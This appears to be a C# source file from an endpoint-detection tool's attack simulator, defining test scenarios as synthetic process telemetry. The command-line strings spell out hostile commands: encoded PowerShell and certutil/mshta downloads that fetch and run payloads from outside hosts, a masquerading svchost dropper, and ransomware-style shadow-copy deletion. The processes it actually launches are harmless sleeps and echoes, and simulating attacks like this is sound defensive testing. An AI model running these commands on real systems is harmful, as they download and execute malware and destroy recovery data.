using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using Phalanx.Shared.Protos;

using System.Linq;

namespace Phalanx.AttackSimulator.Scenarios;

public sealed class AttackScenario
{
    public int Id { get; init; }
    public string Name { get; init; } = string.Empty;
    public string Description { get; init; } = string.Empty;
    public string ExpectedAction { get; init; } = "ACTION_KILL";
    public Func<uint, TelemetryBatch> BuildBatch { get; init; } = null!;
    public Func<ProcessStartInfo?>? GetSafeOsProcessInfo { get; init; }
}

public static class AttackScenarioRegistry
{
    private static readonly Random Rnd = new();

    public static uint GeneratePid() => (uint)Rnd.Next(10000, 60000);

    public static IReadOnlyList<AttackScenario> AllScenarios { get; } = new List<AttackScenario>
    {
        // --------------------------------------------------------------------
        // [1] Office LOLBAS C2 Dropper
        // --------------------------------------------------------------------
        new()
        {
            Id = 1,
            Name = "Office LOLBAS C2 Dropper",
            Description = "winword.exe ➔ powershell.exe -enc <C2 다운로더> (24μs 선제 동결 ➔ ReAct 3턴 사살)",
            ExpectedAction = "ACTION_KILL",
            BuildBatch = targetPid =>
            {
                uint ppid = 3104;
                string script = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
                string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
                string fullCmd = $"powershell.exe -w hidden -enc {b64}";

                var batch = new TelemetryBatch();
                // 1. 부모 오피스 프로세스 스냅샷
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 1000,
                    ImageName = "winword.exe",
                    CommandLine = "winword.exe 2026_09_invoice.docm",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                // 2. 동결된 의심 자식 프로세스
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "powershell.exe",
                    CommandLine = fullCmd,
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [2] Ransomware Shadow Copy Deletion
        // --------------------------------------------------------------------
        new()
        {
            Id = 2,
            Name = "Ransomware Shadow Copy Deletion",
            Description = "vssadmin.exe delete shadows /all /quiet (C++ 로컬 룰 엔진 0.1ms 현장 사살)",
            ExpectedAction = "ACTION_KILL",
            BuildBatch = targetPid =>
            {
                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = 1000,
                    ImageName = "vssadmin.exe",
                    CommandLine = "vssadmin.exe delete shadows /all /quiet",
                    IsSuspended = false,
                    IsTerminated = true,
                    Lifecycle = ProcessLifecycle.LifecycleTerminated
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c echo [Simulated vssadmin] && timeout /t 10",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [3] LOLBAS CertUtil Remote Payload Download
        // --------------------------------------------------------------------
        new()
        {
            Id = 3,
            Name = "LOLBAS CertUtil Remote Payload Download",
            Description = "excel.exe ➔ certutil.exe -urlcache -split -f http://... (24μs 동결 ➔ 위협 평판 ➔ 사살)",
            ExpectedAction = "ACTION_KILL",
            BuildBatch = targetPid =>
            {
                uint ppid = 2208;
                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 1000,
                    ImageName = "excel.exe",
                    CommandLine = "excel.exe budget_2026.xlsm",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "certutil.exe",
                    CommandLine = "certutil.exe -urlcache -split -f http://185.220.101.5/malware.exe C:\\Windows\\Temp\\malware.exe",
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            }
        },

        // --------------------------------------------------------------------
        // [4] Browser Drive-by HTA Attack
        // --------------------------------------------------------------------
        new()
        {
            Id = 4,
            Name = "Browser Drive-by HTA Attack",
            Description = "msedge.exe ➔ mshta.exe http://... (24μs 동결 ➔ 킬체인 매핑 ➔ 사살)",
            ExpectedAction = "ACTION_KILL",
            BuildBatch = targetPid =>
            {
                uint ppid = 5120;
                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 1000,
                    ImageName = "msedge.exe",
                    CommandLine = "msedge.exe https://trusted-portal.com",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "mshta.exe",
                    CommandLine = "mshta.exe http://185.220.101.5/invoice.hta",
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            }
        },

        // --------------------------------------------------------------------
        // [5] Masquerading Dropper (T1036.005)
        // --------------------------------------------------------------------
        new()
        {
            Id = 5,
            Name = "Masquerading Dropper (T1036.005)",
            Description = "explorer.exe ➔ powershell.exe -enc ... ➔ Temp\\svchost.exe (5턴 심층 수사 ➔ 사살 및 방화벽 차단)",
            ExpectedAction = "ACTION_KILL",
            BuildBatch = targetPid =>
            {
                uint ppid = 1000;
                string script = "(New-Object Net.WebClient).DownloadFile('http://198.51.100.99/update.dat', 'C:\\Windows\\Temp\\svchost.exe'); Start-Process 'C:\\Windows\\Temp\\svchost.exe'";
                string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
                string fullCmd = $"powershell.exe -w hidden -enc {b64}";

                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 0,
                    ImageName = "explorer.exe",
                    CommandLine = "C:\\Windows\\explorer.exe",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "powershell.exe",
                    CommandLine = fullCmd,
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            }
        },

        // --------------------------------------------------------------------
        // [6] Benign Administrative Script (Known-Good)
        // --------------------------------------------------------------------
        new()
        {
            Id = 6,
            Name = "Benign Admin Script (Known-Good)",
            Description = "explorer.exe ➔ powershell.exe -enc <Get-Service *.internal> (오탐 방지 가드 ➔ 1ms ACTION_RESUME)",
            ExpectedAction = "ACTION_RESUME",
            BuildBatch = targetPid =>
            {
                uint ppid = 1000;
                string script = "Get-Service -Name '*backup*' | Select-Object Name, Status | Out-File -FilePath '\\\\fileserver.corp.local\\logs\\status.log'";
                string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
                string fullCmd = $"powershell.exe -NoProfile -enc {b64}";

                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 0,
                    ImageName = "explorer.exe",
                    CommandLine = "C:\\Windows\\explorer.exe",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "powershell.exe",
                    CommandLine = fullCmd,
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            }
        },

        // --------------------------------------------------------------------
        // [7] Process Tree DAG Burst (Stress Test)
        // --------------------------------------------------------------------
        new()
        {
            Id = 7,
            Name = "Process Tree DAG Burst (Stress Test)",
            Description = "50개 프로세스 생성/종료 델타 이벤트 연속 주입 (Cockpit UI 60FPS 렌더링 검증)",
            ExpectedAction = "ACTION_RESUME",
            BuildBatch = targetPid =>
            {
                var batch = new TelemetryBatch();
                string[] sampleImages = { "code.exe", "dotnet.exe", "git.exe", "conhost.exe", "chrome.exe" };

                for (int i = 0; i < 50; i++)
                {
                    uint pid = targetPid + (uint)i;
                    uint ppid = 1000 + (uint)(i % 5);
                    string img = sampleImages[i % sampleImages.Length];

                    batch.ProcessEvents.Add(new ProcessEvent
                    {
                        ProcessId = pid,
                        ParentProcessId = ppid,
                        ImageName = img,
                        CommandLine = $"{img} --worker-task-{i}",
                        Lifecycle = ProcessLifecycle.LifecycleStart
                    });
                }
                return batch;
            }
        }
    };

    public static AttackScenario? FindById(int id) => AllScenarios.FirstOrDefault(s => s.Id == id);
}
